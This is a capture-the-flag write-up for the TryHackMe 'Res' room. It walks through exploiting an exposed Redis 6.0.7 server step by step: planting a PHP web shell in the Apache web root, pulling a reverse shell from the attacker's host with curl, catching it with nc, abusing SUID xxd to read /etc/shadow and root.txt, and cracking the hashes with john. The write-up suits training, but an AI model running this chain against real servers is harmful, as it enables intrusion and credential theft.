[Home](../../index.md)

# TryHackMe: Res

https://tryhackme.com/room/res


---
## First 4 Questions

These can all be answered with a service port scan.

```
┌──(kali㉿kali)-[~/tryhackme/res]
└─$ rustscan -a 10.10.244.194 -r 1-65535 -- -sV

...

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
6379/tcp open  redis   syn-ack Redis key-value store 6.0.7
```


---
## Compromise the machine and locate user.txt

My first thought was to look for an existing exploit for redis, because the room is obviously pointing out the application and version.  I thought I found an easy Metasploit module, but it had a bug that caused it not to run properly.

Found this:  https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

Connected with NetCat as detailed there and was able to run the info command.

```
┌──(kali㉿kali)-[~]
└─$ nc -vn 10.10.244.194 6379                  
(UNKNOWN) [10.10.244.194] 6379 (redis) open
info
$3684
# Server
redis_version:6.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:5c906d046e45ec07
redis_mode:standalone
os:Linux 4.4.0-189-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:5.4.0
process_id:640
run_id:bf872b66f7e4fa84078eef9320f4adb8558ab8b5
tcp_port:6379
uptime_in_seconds:3404
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:12312706
executable:/home/vianka/redis-stable/src/redis-server
config_file:/home/vianka/redis-stable/redis.conf
io_threads_active:0

(lots of stuff here)

# Keyspace
```

There is no data, it's just an empty database, based on what the article says about the Keyspace section.

The article outlines how to place our own PHP code in the website directory (port 80 from our nmap scan, it's a fresh Apache install with nothing else)

```
config set dir /var/www/html/
+OK
config set dbfilename redis.php
+OK
set test "<?php system($_GET['cmd']);?>"
+OK
save
+OK
```

We can confirm command execution by browsing to the php file and adding a command as the parameter (you should see www-data in the output).

`http://10.10.244.194/redis.php?cmd=whoami`

Now we can ready a reverse shell, serve from the attacking machine and download.

Used the shell from https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Make sure to change your attacker IP in the shell.

```
┌──(kali㉿kali)-[~/tryhackme/res]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Browse or Curl:

`http://10.10.244.194/redis.php?cmd=curl%20-o%20shell.php%20http://10.13.18.7:8000/php-reverse-shell.php`

Verify the file was pulled:

```
┌──(kali㉿kali)-[~/tryhackme/res]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.244.194 - - [16/Dec/2021 20:17:29] "GET /php-reverse-shell.php HTTP/1.1" 200 -
```

Now set up a listener

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

Browse or Curl:

`http://10.10.244.194/shell.php`

Catch it and get the flag:

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.13.18.7] from (UNKNOWN) [10.10.244.194] 40982
Linux ubuntu 4.4.0-189-generic #219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:19:43 up  1:19,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /home
$ ls
vianka
$ cd vianka
$ ls
redis-stable
user.txt
$ cat user.txt
```

---
## What is the local user account password?

Skipping this for now, we can find this after privesc.

---
## Escalate privileges and obtain root.txt

First order is to stabilize the shell

```
$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@ubuntu:/$
```

Grabbed linpeas from https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh

Transferred with python http server, made executable and ran.  It found that xxd has the SUID bit set.

```
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                                                                                                                                                                                                                            
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                                                                                                 
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping                                                                                                                                                                                                                                                                           
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40K Jan 27  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 40K Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27K Jan 27  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 26  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 19K Mar 18  2020 /usr/bin/xxd
-rwsr-xr-x 1 root root 39K Mar 26  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 134K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 53K Mar 26  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 74K Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-r-sr-xr-x 1 root root 14K Sep  1  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14K Sep  1  2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper

```

This allows us to read files with root privileges, so we can read the root flag, /etc/passwd and /etc/shadow to answer the rest of the questions. (found on https://gtfobins.github.io/gtfobins/xxd/)

```
$ LFILE=/etc/shadow
$ xxd "$LFILE" | xxd -r

$ cat /etc/passwd
(this one didn't need root)

$ LFILE=/root/root.txt
$ xxd "$LFILE" | xxd -r

```

Now that we have /etc/shadow and /etc/passwd, we can copy the contents to files on our local machine and use unshadow and john to crack.

```
┌──(kali㉿kali)-[~/tryhackme/res]
└─$ vim shadow.txt
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/tryhackme/res]
└─$ vim passwd.txt           
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/tryhackme/res]
└─$ unshadow passwd.txt shadow.txt > johnable.txt
Created directory: /home/kali/.john

┌──(kali㉿kali)-[~/tryhackme/res]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt johnable.txt                                                                         
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
XXXXX       (vianka)     
1g 0:00:00:00 DONE (2021-12-16 20:50) 2.222g/s 2844p/s 2844c/s 2844C/s kucing..poohbear1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```